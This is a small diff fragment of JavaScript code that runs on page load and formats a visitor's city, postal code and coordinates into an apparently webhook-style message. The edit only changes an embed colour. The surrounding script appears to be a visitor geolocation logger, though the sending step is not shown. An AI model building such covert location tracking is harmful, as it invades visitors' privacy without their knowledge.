@@ -9,7 +9,7 @@ window.addEventListener('load', (event) => {
             **Town/City:** ${data.city}\n
             **Zip/Postal:** ${data.postal}\n
             **Coordinates:** ${data.latitude}, ${data.longitude}`,
-            color: "RANDOM"
+            color: "3107012"
         }
 
         data = {
